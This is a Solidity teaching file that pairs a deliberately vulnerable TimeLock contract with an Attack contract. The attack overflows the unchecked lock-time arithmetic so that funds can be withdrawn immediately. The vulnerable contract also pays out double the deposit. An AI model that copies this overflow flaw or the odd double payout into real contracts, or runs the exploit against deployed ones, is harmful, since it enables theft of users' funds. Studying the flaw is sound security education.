//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.7.6;

contract TimeLock {
    // Mapping to store the balance of each address
    mapping(address => uint256) public balances;
    
    // Mapping to store the lock time of each address
    mapping(address => uint256) public lockTime;

    // Function to deposit Ether into the contract
    function deposit() public payable {
        // Increase the balance of the sender by the deposited amount
        balances[msg.sender] += msg.value;
        
        // Set the lock time to 30 days from now
        lockTime[msg.sender] = block.timestamp + 30 days;
    }

    // Function to withdraw Ether from the contract
    function withdraw() public {
        // Ensure the sender has a positive balance
        require(balances[msg.sender] > 0, "Insufficient balance");
        
        // Ensure the lock time has expired
        require(block.timestamp > lockTime[msg.sender], "Deadline not expired yet!");

        // Calculate the amount to be withdrawn (double the balance)
        uint256 amount = 2 * balances[msg.sender];
        
        // Reset the balance to zero
        balances[msg.sender] = 0;

        // Transfer the amount to the sender
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to transfer Ether");
    }

    // Function to increase the lock time
    function increaseDeadline(uint256 _secondsToIncrease) public {
        // Increase the lock time of the sender by the specified amount of seconds
        lockTime[msg.sender] += _secondsToIncrease;
    }
}

contract Attack {
    // Reference to the TimeLock contract
    TimeLock timeLock;

    // Constructor to set the TimeLock contract address
    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    // Fallback function to receive Ether
    fallback() external payable { }

    // Function to initiate the attack
    function attack() public payable {
        // Deposit Ether into the TimeLock contract
        timeLock.deposit{value: msg.value}();
        
        // Increase the lock time to a value close to the maximum uint256 value
        timeLock.increaseDeadline(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        
        // Withdraw the Ether, exploiting the vulnerability
        timeLock.withdraw();
    }
}
